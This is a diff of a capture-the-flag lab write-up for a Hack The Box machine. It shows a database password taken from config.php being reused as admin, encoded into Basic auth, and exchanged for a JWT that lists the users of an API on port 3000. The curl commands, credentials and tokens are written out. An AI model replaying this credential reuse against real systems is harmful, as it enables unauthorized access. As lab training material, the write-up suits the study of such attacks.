@@ -137,7 +137,7 @@ GENERATED WORDS: 4612
 + http://10.10.10.137:3000/users (CODE:200|SIZE:56)
 + http://10.10.10.137:3000/Users (CODE:200|SIZE:56)
 ```
-Visiting the login pages returns `please auth` and visiting the user pages retuens the same mesage that we received earilier of 10.10.10.137:3000 `{"success":false,"message":"Auth token is not supplied"}`. We'll have to figure out how to get that token soon. 
+Visiting the login pages returns `please auth` and visiting the user pages retuens the same mesage that we received earilier on port 3000 `{"success":false,"message":"Auth token is not supplied"}`. We'll have to figure out how to get that token soon. 
 
 nikto output had more goodies:
 
@@ -174,7 +174,7 @@ the site in a different fashion to the MIME type
 
 The interesting thing here is the presence of `config.php`, `login.php`, and `package.json`. I ran wfuzz looking for more php and json files.
 
-`login.php` presents us with our fourth login point:
+`login.php` presents us with our fourth(!) login point:
 
 -scrnshot-
 
@@ -185,7 +185,64 @@ $dbHost = 'localhost'; $dbUsername = 'root'; $dbPassword = 'Zk6heYCyv6ZE9Xcg'; $
 mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
 ```
 
-`root:Zk6heYCyv6ZE9Xcg`. Awesome. I tried that against `10.10.10.137/login.php`, `10.10.10.137/management`, and `10.10.10.137:8000` with zero sucsess. I will need to figure out how to pass it to the pages on `10.10.10.137:3000`.
+`root:Zk6heYCyv6ZE9Xcg`. Awesome. I tried that against `10.10.10.137/login.php`, `10.10.10.137/management`, and `10.10.10.137:8000` with no success. I will need to figure out how to pass the creds `10.10.10.137:3000`.
 
+### curl
+
+On the htb forums it mentioned this article: [Using cURL to authenticate with JWT Bearer tokens](https://medium.com/@nieldw/using-curl-to-authenticate-with-jwt-bearer-tokens-55b7fac506bd). This info was invaluable in helping me to usnder stand how to auth on port 3000. It was also in the forums that I found out the database username `root` was not the username that gained access.  
+
+I played around with curl for a while against the four login points with . I tried the `login.php` page on port 80 with the db creds, and eventually got a Authorization header of interest:
+
+```
+curl -v -u admin:Zk6heYCyv6ZE9Xcg http://10.10.10.137:80/login.php
+
+* Expire in 0 ms for 6 (transfer 0x55bcd130ec40)
+* Trying 10.10.10.137...
+* TCP_NODELAY set
+* Expire in 200 ms for 4 (transfer 0x55bcd130ec40)
+* Connected to 10.10.10.137 (10.10.10.137) port 80 (#0)
+* Server auth using Basic with user 'admin'
+> GET /login.php HTTP/1.1
+> Host: 10.10.10.137
+> Authorization: Basic YWRtaW46Wms2aGVZQ3l2NlpFOVhjZw==
+> User-Agent: curl/7.64.0
+> Accept: */*
+```
+
+The basic authorization value seen in the above GET request turns out to be `admin:Zk6heYCyv6ZE9Xcg` base64 encoded. Okay. Let's send that to the login on port 3000 and see what we get. After trying many different things, the below curl command   
+
+```
+curl -H 'Accept: application/json' -H 'Content-Type: application/json' H "Authorization: Basic
+YWRtaW46Wms2aGVZQ3l2NlpFOVhjZw==" --data '{"username":"admin","password":"Zk6heYCyv6ZE9Xcg"}' http://
+10.10.10.137:3000/login
+```
+returns
+
+```
+{"success":true,"message":"Authentication
+successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzQzNDUwLCJleHAiOjE1NjM4Mjk4rzehjxRxuFsFSjw9Wb67LvvY"}
+```
+We now have a JWT Auth token! Let's use it against port 3000:
+
+```
+curl -H 'Accept: application/json' -H "Authorization: Bearer
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000
+{"message":"Welcome admin ! "}
+```
+
+Against 10.10.10.137:3000/users: 
+
+```
+curl -H 'Accept: application/json' -H "Authorization: Bearer
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTYzNzU4NzkxLCJleHAiOjE1NjM4NDUxOTF9.iSeAjXFvb3_hupQ1K http://10.10.10.137:3000/users
+
+[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"}, {"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
+```
+
+Many more usernames, including Derry, who wrote the note that we found via anonymous ftp.
+
+### I Should have dirb-ed more...
+
+Here I was stuck for a while because I did not enumerate past 10.10.010.137:3000/users. If I would have, I would have found 10.10.10.137:3000/users/admin 
 
 ### Gain Access
